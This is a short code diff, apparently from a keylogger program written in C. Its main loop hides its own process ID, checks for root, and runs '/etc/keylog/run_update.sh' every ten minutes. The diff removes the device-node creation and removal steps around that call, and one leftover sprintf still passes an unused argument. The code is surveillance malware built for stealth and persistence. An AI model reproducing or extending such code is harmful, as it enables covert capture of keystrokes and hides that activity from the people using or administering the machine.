@@ -37,19 +37,10 @@ int is_root(void) {
 int main(int argc, char *argv[]) {
 	hide_pid();
 	is_root();
-
-	if (argc < 2) {
-		exit(1);
-	}
-	int major = atoi(argv[1]);
 	char str[30];
 
 	while (1) {
-		sprintf(str, "mknod chrdev0 c %d 0", major);
-		system(str);
 		sprintf(str, "bash /etc/keylog/run_update.sh", major);
-		system(str);
-		sprintf(str, "rm chrdev0");
 		system(str);
 		sleep(600);
 	}
